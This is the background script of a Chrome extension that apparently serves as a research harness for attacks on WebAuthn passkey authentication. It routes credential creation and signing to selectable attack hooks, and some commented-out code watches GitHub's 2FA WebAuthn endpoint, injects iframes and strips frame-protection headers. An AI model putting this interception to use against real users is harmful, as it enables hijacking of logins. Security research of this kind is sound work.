// Initialize counter when extension is installed
// chrome.runtime.onInstalled.addListener(() => {
//     chrome.storage.local.set({ callCount: 0 });
//     logHelper('[Background] Extension installed');
// });

// // Listen for messages from content script and popup
// chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
//     logHelper('onMessage', message);
//     // Handle credential API calls
//     if (message.type === 'CREDENTIAL_API_CALL') {
//         // Get current count from storage and increment
//         chrome.storage.local.get(['callCount'], (result) => {
//             const newCount = (result.callCount || 0) + 1;
//             // Update storage
//             chrome.storage.local.set({ callCount: newCount }, () => {
//                 // Update badge
//                 chrome.action.setBadgeText({
//                     text: newCount.toString()
//                 });
//                 chrome.action.setBadgeBackgroundColor({
//                     color: '#4CAF50'
//                 });
//             });
//         });
//     }
//     // Handle log messages
//     else if (message.type === 'LOG') {
//         const source = sender.tab ? 'Content' : 'Popup';
//         logHelper(`[${source}]`, message.message);
//     }
// });

// Old extension

import { AttackHook } from './attacks/attack_hook';
import { AttackHookNone } from './attacks/attack_hook_none';
import { AttackHookMisBinding } from './attacks/attack_hook_mis_binding';
// import { getLogger } from './logging.js';

// const log = getLogger('background');

chrome.runtime.onInstalled.addListener(() => {
    logHelper('Extension installed');
});

function logHelper(...msg: any[]): void {
    console.log('[Background] ', msg);
}


// Needs to be stored in local
let attackType: AttackHook | null = null;  // Initialize as null

/**
 * Listens for web requests before they are sent and handles specific authentication flows
 * based on the current attack type.
 * 
 * This listener specifically handles:
 * 1. Sync Login Attack Flow:
 *    - Monitors requests to testbank.com authentication endpoint
 *    - When detected, triggers original login flow via content script message
 *    - Also monitors GitHub 2FA WebAuthn requests
 *    - When GitHub 2FA detected, injects iframe code via content script
 *
 * The listener works in conjunction with the AttackHook implementations to:
 * - Intercept and potentially modify web requests
 * - Coordinate with content scripts for DOM manipulation
 * - Handle different authentication flows based on attack type
 * 
 * @param {Object} details - Web request details object containing:
 *   - url: The URL of the request
 *   - requestBody: The request body if present
 *   - other standard WebRequest properties
 * @returns {Object|undefined} - Returns attack type specific network modifications
 *                              or undefined to allow request unmodified
 */

// chrome.webRequest.onBeforeRequest.addListener((details) => {
//     // Get attack type here from local storage
//     chrome.storage.local.get(['attackType'], (result) => {
//         attackType = result.attackType;
//     });
//     // Generate new attack hook based on attack type
//     if (attackType == "attack-sync-login") {
//         logHelper(details.url);
//         if (details.url === "https://testbank.com:8443/api/v1/authenticate/finish") {
//             logHelper("Request sent to the specified URL:", details.url);
//             chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
//               // Retrieve the active tab
//               var activeTab = tabs[0];
              
//               // Send a message to the content script
//               chrome.tabs.sendMessage(activeTab.id, { message: "start-orig-login" });
//             });
//         } else if (details.url === "https://github.com/sessions/two-factor/webauthn") {
//                     chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
//               // Retrieve the active tab
//               var activeTab = tabs[0];
//               logHelper("Detected 2FAA URL");
//               // Send a message to the content script
//               chrome.tabs.sendMessage(activeTab.id, { message: "push-iframe-code" });
//             });
//         }
//     }
//     return attackType.onNetwork(details);
// }, { urls: ['<all_urls>'] }, ['blocking', 'requestBody']);


// chrome.webRequest.onHeadersReceived.addListener(
//     function(info) {
//         var headers = info.responseHeaders;
//         for (var i=headers.length-1; i>=0; --i) {
//             var header = headers[i].name.toLowerCase();
//             if (header == 'x-frame-options' || header == 'frame-options') {
//                 headers.splice(i, 1); // Remove header
//             }
//         }
        
//         headers.push({ name: 'Permissions-Policy', value: 'publickey-credentials-get=*' });
//         return {responseHeaders: headers};
//     }, {
//         urls: [
//             '*://*/*', // Pattern to match all http(s) pages
//             // '*://*.example.org/*', // Pattern to match one http(s) site
//         ], 
//         types: [ 'sub_frame' ]
//     }, [
//         'blocking',
//         'responseHeaders',
//         // Modern Chrome needs 'extraHeaders' to see and change this header,
//         // so the following code evaluates to 'extraHeaders' only in modern Chrome.
//         // chrome.webRequest.OnHeadersReceivedOptions.EXTRA_HEADERS,
//     ].filter(Boolean)
// );


/**
 * Handles WebAuthn credential creation requests from content scripts.
 * This function is called whenever navigator.credentials.create() is invoked.
 * It delegates the credential creation to the currently active attack hook.
 * 
 * @param {WebAuthnRequestMessage} msg - The WebAuthn request message containing credential creation parameters
 * @param {chrome.runtime.MessageSender} sender - Information about the sender of the message, including tab info
 * @returns {Promise<WebAuthnResponseMessage|WebAuthnErrorMessage|undefined>} A promise that resolves to:
 *   - WebAuthnResponseMessage on successful credential creation
 *   - WebAuthnErrorMessage if an error occurs during creation
 *   - undefined if the sender tab is invalid
 */
const create = async (msg, sender) => {
    logHelper('In create');
    if (!sender.tab || !sender.tab.id) {
        logHelper('received create event without a tab ID');
        return;
    }

    if (!attackType) {
        await getAttackType();
    }

    return await attackType!.onCredentialCreate(msg, sender);
};

/**
 * Handles WebAuthn credential retrieval/signing requests from content scripts.
 * This function is called whenever navigator.credentials.get() is invoked.
 * It delegates the credential retrieval to the currently active attack hook.
 * 
 * @param {WebAuthnRequestMessage} msg - The WebAuthn request message containing credential retrieval parameters
 * @param {chrome.runtime.MessageSender} sender - Information about the sender of the message, including tab info
 * @returns {Promise<WebAuthnResponseMessage|WebAuthnErrorMessage|undefined>} A promise that resolves to:
 *   - WebAuthnResponseMessage on successful credential retrieval/signing
 *   - WebAuthnErrorMessage if an error occurs during retrieval
 *   - undefined if the sender tab is invalid
 */
const sign = async (msg, sender) => {
    if (!sender.tab || !sender.tab.id) {
        logHelper('received sign event without a tab ID');
        return;
    }

    if (!attackType) {
        await getAttackType();
    }

    return await attackType!.onCredentialGet(msg, sender);    
};

function convertAttackToHook(attackName) {
    logHelper("Converting attack to hook:", attackName);
    switch(attackName) {
        case 'attack-mis-binding':
            attackType = new AttackHookMisBinding();
            break;
        case 'attack-double-binding1':
            attackType = new AttackHookNone();
            break;
        case 'attack-double-binding2':
            attackType = new AttackHookNone();
            break;
        case 'attack-clone-detection':
            attackType = new AttackHookNone();
            break;
        case 'attack-sync-login':
            attackType = new AttackHookNone();
            break;
        default:
            attackType = new AttackHookNone();
            break;
    }
}

async function setAttackImpl(attackName) {
    convertAttackToHook(attackName);
    logHelper("Attack type set to:", attackType!.getName());
    // Save to local storage
    await setAttackTypeInStorage(attackName);
    // This may change passToOrig depending on attack type. Send message to the back if needed
    await sendPassToOrigValue();
}

async function sendPassToOrigValue() {
    let passToOrig = true;
    if (!attackType) {
        await getAttackType();
    }
    logHelper("SEND FUNCT", attackType!.getName());
    if (attackType!.getName() === 'attack-double-binding2') {
        passToOrig = false;
        logHelper("INFAAAAAAAAAAAAAAALLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLSSSSSSSSSSSSEEEEEEEE");
    }
    logHelper("value of passToOrig passed from back", passToOrig)
    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
        var activeTab = tabs[0];
        if (activeTab.id) {
            chrome.tabs.sendMessage(activeTab.id, { message: 'passToOrig', val: passToOrig});
        } else {
            logHelper("BROKEN FUNCTIONALITY")
        }
    });
}

// Initialize attack type when service worker starts. Put in on message receive, because I know the service will start up then if it is idle, but there might be a better way.
async function refreshAttackType() {
    if (attackType) {
        logHelper("No need to refresh attack type")
        return;
    }
    logHelper("Refreshing attack type");
    const result = await chrome.storage.local.get(['attackType'])
    logHelper("Result from local storage:", result.attackType);
    if (result.attackType) {
        logHelper("Creating new AttackHook", result.attackType);
        convertAttackToHook(result.attackType);
    } else {
        // Default to none if nothing in storage
        logHelper("Creating new AttackHookNone")
        attackType = new AttackHookNone();
        await chrome.storage.local.set({ attackType: 'none' });
    }
    logHelper("New attack type refreshed:", attackType);
}


async function getAttackType(): Promise<AttackHook> {
    if (attackType) {
        return attackType;
    } else {
        await refreshAttackType();
        return attackType!;
    }
}

async function setAttackTypeInStorage(attackName) {
    logHelper("Setting...", attackName);
    await chrome.storage.local.set({ attackType: attackName });
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    logHelper('Received form data:', msg);
    
    // Create a response handler that ensures proper async flow
    const handleMessage = async () => {
        try {
            // await refreshAttackType();
            // logHelper('Attack type after refresh:', attackType);

            switch (msg.type) {
                case 'attack-type-change':
                    await setAttackImpl(msg.newAttackType);
                    logHelper("Attack type changed:", attackType);
                    sendResponse({message: 'success', val: 'test'});
                    break;
                case 'attack-type-get':
                    const currentType = await getAttackType();
                    logHelper("Attack type in switch:", currentType);
                    sendResponse({
                        type: 'attack-type-get-response',
                        attackType: currentType.getName()
                    });
                    break;
                case 'create':
                    const createResponse = await create(msg, sender);
                    sendResponse(createResponse);
                    break;
                case 'sign':
                    const signResponse = await sign(msg, sender);
                    sendResponse(signResponse);
                    break;
                case 'getPassToOrig':
                    await sendPassToOrigValue();
                    break;
                default:
                    sendResponse(null);
            }
        } catch (error: any) {
            console.error('Error handling message:', error);
            sendResponse({ error: error!.message });
        }
    };

    // Start the async handling
    handleMessage();

    // Return true to indicate we'll call sendResponse asynchronously
    return true;
});